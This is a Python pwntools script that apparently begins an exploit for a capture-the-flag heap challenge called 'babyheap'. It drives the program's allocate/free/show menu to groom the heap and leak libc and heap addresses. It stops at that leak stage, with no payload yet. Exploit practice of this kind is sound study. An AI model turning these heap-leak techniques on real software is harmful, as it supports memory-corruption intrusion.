#!/usr/bin/python
from pwn import *

def command(c):
    p.recvuntil('Command:\n>')
    p.sendline(c)

def malloc(data, size):
    command('M')
    p.recvuntil('>')
    p.sendline(str(size))
    p.recvuntil('>')
    p.sendline(data.strip())

def free(ind):
    command('F')
    p.recvuntil('>')
    p.sendline(str(ind))

def show(ind):
    command('S')
    p.recvuntil('> ')
    p.sendline(str(ind))
    return p.recvuntil('\n---', drop=True)

    
def main():
    global p
    p = process('./babyheap')

    for i in range(9):
        malloc('AA', 1)
    for i in reversed(range(9)):
        free(i)
    for i in range(9):
        malloc('AA', 1)

    malloc('AA', 1)
    # Leak libc + heap
    log.info(enhex(show(7)))
    log.info(enhex(show(5)))

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        p.interactive()
        raise
